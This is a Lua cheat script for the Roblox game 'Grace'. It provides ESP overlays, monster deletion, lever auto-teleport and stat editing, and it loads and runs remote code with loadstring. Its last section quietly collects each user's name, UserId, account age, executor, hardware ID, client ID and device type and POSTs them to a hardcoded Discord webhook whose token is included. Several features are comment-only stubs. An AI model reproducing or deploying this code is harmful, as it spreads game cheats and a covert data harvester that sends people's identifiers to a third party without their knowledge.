GraceESP:Toggle("门透视", "GTQR15", false, function(state)
    -- 逻辑：遍历 workspace 寻找 Name == "Door" 的模型，添加 BillboardGui
    -- 包含 DescendantAdded 监听
    -- 颜色：红色
end)

-- 计时门透视
GraceESP:Toggle("计时门透视", "GTQR15", false, function(state)
    -- Name == "VaultDoor"，颜色：黄色
end)

-- 磅秤/天平透视
GraceESP:Toggle("磅秤透视", "GTQR15", false, function(state)
    -- Name == "Scale"，颜色：红色
end)

-- 管道透视
GraceESP:Toggle("管道透视", "GTQR15", false, function(state)
    -- Name == "VaultEntrance"，颜色：蓝色
end)

-- 拉杆/断路器透视
GraceESP:Toggle("拉杆透视", "GTQR15", false, function(state)
    -- Name == "Breaker"，颜色：红色
end)

-- >>> 删除功能 (移除特定实体) <<<
local DeleteSection = GraceTab:section("删除功能", true)

-- 删除各种实体 (防止吓人或降低难度)
DeleteSection:Toggle("删除Worm", "Worm", false, function(state)
    -- 循环删除 ReplicatedStorage.SendWorm
end)
DeleteSection:Toggle("删除红色眼睛", "Worm", false, function(state)
    -- 循环删除 ReplicatedStorage.SendRush
end)
-- ... 删除 Goatman, Sorrow, elkman ...

-- 一键删除怪物 (DescendantAdded 监听)
DeleteSection:Button("一键删除怪物(笑脸和跑男无法删除)", function()
    workspace.DescendantAdded:Connect(function(obj)
        if obj.Name == "eye" or obj.Name == "elkman" or obj.Name == "Rush" or obj.Name == "Worm" or obj.Name == "eyePrime" then
            obj:Destroy()
        end
    end)
    -- 移除屏幕上的 eyegui
end)

-- 删除黑眼睛
DeleteSection:Button("删除黑眼睛", function()
    workspace.DescendantAdded:Connect(function(obj)
        if obj.Name == "eye" and obj:IsA("BasePart") then
            obj:Destroy()
        end
    end)
end)

-- 自动拉杆 (瞬移拉杆到玩家)
DeleteSection:Button("自动拉杆(推荐开启)", function()
    workspace.DescendantAdded:Connect(function(obj)
        if obj.Name == "base" and obj:IsA("BasePart") then
            -- 将 base 移动到玩家位置
            obj.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
            -- 加载 VisionLibV2 发送通知 "自动拉杆已刷新"
            local VisionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Loco-CTO/UI-Library/main/VisionLibV2/source.lua"))()
            VisionLib:ForceNotify({
                Name = "叶脚本 ｜ 自动拉杆提示 ｜ Grace",
                Text = "检测到前方拉杆已刷新 正在自动拉杆",
                Duration = 3
            })
            -- 播放成功音效
        end
    end)
end)

-- 怪物刷新提醒 (监听 Workspace 变化)
DeleteSection:Toggle("怪物刷新提醒", "text", false, function(state)
    local VisionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Loco-CTO/UI-Library/main/VisionLibV2/source.lua"))()
    -- 列表：eyePrime, smile, elkman, Rush, SendWorm
    -- 匹配到名字则发送通知
end)

-- 房间刷新提醒 (监听 Frame)
DeleteSection:Toggle("房间刷新提醒", "renovate", false, function(state)
    -- 监听 Name == "Frame"
end)

-- 管道刷新提醒 (监听 Hinged)
DeleteSection:Toggle("管道刷新提醒", "renovate", false, function(state)
    -- 监听 Name == "Hinged"
end)

-- >>> 修改功能 (修改数值) <<<
local ModifySection = GraceTab:section("修改功能（娱乐）", true)
ModifySection:Textbox("修改钥匙", "arg", "输入", function(val)
    game:GetService("Players").LocalPlayer.Keys.Value = val
end)
ModifySection:Textbox("修改砖块", "arg", "输入", function(val)
    game:GetService("Players").LocalPlayer.leaderstats.Bricks.Value = val
end)
-- ... 修改等级、经验、死亡时间 ...

--================================================================================
-- 4. Webhook 日志记录 (收集用户信息发送到 Discord)
--================================================================================

local WebhookURL = "https://discord.com/api/webhooks/1324884354563969054/3oRJXNc6GI3RUMJ0cLlR7DQ2Cndc3z3cK1dlosu0yNmNwYO_GbiniGG5yPUFLBrlDKYk"
local Player = game:GetService("Players").LocalPlayer
local JoinDate = os.date("!*t", os.time() - Player.AccountAge * 86400)

-- 判断设备类型
_G.IsPc = false
if game.UserInputService.KeyboardEnabled and game.UserInputService.MouseEnabled then
    _G.IsPc = "模拟器/PC"
elseif game.UserInputService.TouchEnabled then
    _G.IsPc = "IOS/Android"
else
    _G.IsPc = "IOS/Android/Unknown"
end

local ExecutorName = identifyexecutor() or "Unknown"
-- 获取头像
local AvatarInfo = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", Player.UserId))
local AvatarUrl = game:GetService("HttpService"):JSONDecode(AvatarInfo).data[1].imageUrl

local Payload = {
    username = "bot",
    embeds = {
        {
            color = tonumber(tostring("0x32CD32")), -- 绿色
            title = "有人使用了Grace叶脚本",
            thumbnail = { url = AvatarUrl },
            fields = {
                { name = "名称(Name)", value = Player.Name, inline = true },
                { name = "昵称(DisplayName)", value = Player.DisplayName, inline = true },
                { name = "UserId", value = "[" .. Player.UserId .. "](https://www.roblox.com/users/" .. Player.UserId .. "/profile)", inline = true },
                { name = "地图ID", value = "[" .. game.PlaceId .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")", inline = true },
                { name = "地图名称", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, inline = true },
                { name = "使用的注入器", value = ExecutorName, inline = true },
                { name = "账号年龄", value = Player.AccountAge .. "天", inline = true },
                { name = "加入日期", value = JoinDate.day .. "/" .. JoinDate.month .. "/" .. JoinDate.year, inline = true },
                { name = "HWID", value = gethwid(), inline = true },
                { name = "客户端ID", value = game:GetService("RbxAnalyticsService"):GetClientId(), inline = false },
                { name = "设备", value = _G.IsPc, inline = false }
            }
        }
    }
}

-- 发送 POST 请求
local req = http_request or request or (HttpPost or syn.request)
req({
    Url = WebhookURL,
    Method = "POST",
    Headers = { ["Content-Type"] = "application/json" },
    Body = game.HttpService:JSONEncode(Payload)
})